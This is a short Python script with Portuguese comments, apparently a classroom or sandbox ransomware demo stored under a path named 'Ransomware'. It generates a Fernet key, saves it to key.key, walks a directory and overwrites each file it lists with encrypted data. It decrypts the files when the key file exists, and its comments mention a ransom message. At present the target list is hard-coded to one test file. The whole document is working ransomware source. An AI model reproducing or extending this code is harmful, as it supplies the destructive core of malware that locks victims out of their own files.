import os
import sys
from cryptography.fernet import Fernet

#############################################
#   Função para gerar a chave criptografica
#############################################
def create_cripto_key(file_name):
  # Gerando a chave
  key = Fernet.generate_key()

  # Salvando a chave em arquivo
  with open(file_name, "wb") as key_file:
    key_file.write(key)
  return key
  
#############################################
#   Função para listar arquivos
#############################################
def list_files(path):
  file_list =[]

  for p, _, files in os.walk(os.path.abspath(path)):
    for file in files:
      file_list.append(os.path.join(p, file))
      #print(os.path.join(p, file))
  return file_list


#################################################
#   Função para criptografar os arquivos
#################################################
def cripto(file_list,key):

  for file_name in file_list:
    print(file_name)
    
    # Criptografa o arquivo
    with open(file_name, "rb") as f:
      original_data = f.read()
    
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(original_data)

    # Sobrescreve o arquivo com os dados criptografados
    with open(file_name, "wb") as f:
      f.write(encrypted_data)

    print("Conteúdo criptografado: ", encrypted_data)



#
#   Função para descriptografar os arquivos
#
def decripto(file_list):
  # Lê a chave do arquivo
  with open("key.key", "rb") as key_file:
    key = key_file.read()
    fernet = Fernet(key)
    
  for file_name in file_list:      
    # Decripta o arquivo
    with open(file_name, "rb") as f:
      encrypted_data = f.read()
    decrypted_data = fernet.decrypt(encrypted_data)

    with open(file_name, "wb") as f:
      f.write(decrypted_data)
    # Exibe o conteúdo do arquivo original
    
    print("Conteúdo decriptografado: ", decrypted_data)
    print("Chave: ", key)
 

#
#   Corpo principal do programa
#   verifica se existe a chave para criptografia
#   Se não existir  
#      - gera a chave
#      - salva o conteudo em decripto.key 
#       - criotografa todos os arquivos
#  
#   Se existir, utiliza a chave para descriptografar
#   Se a chave não for a correta gera mensagem resgate 

  # Verifica se existe a chave para decriptografia
  
if(os.path.exists('key.key')):
  print("O arquivo existe")
  lista_files = list_files("./teste")
  lista_files = ['/home/runner/Ransomware/teste/um.txt']
  decripto(lista_files)

else:
  print("O arquivo não existe")
  key = create_cripto_key("key.key")
  lista_files = list_files("./teste")
  lista_files = ['/home/runner/Ransomware/teste/um.txt']
  cripto(lista_files,key)

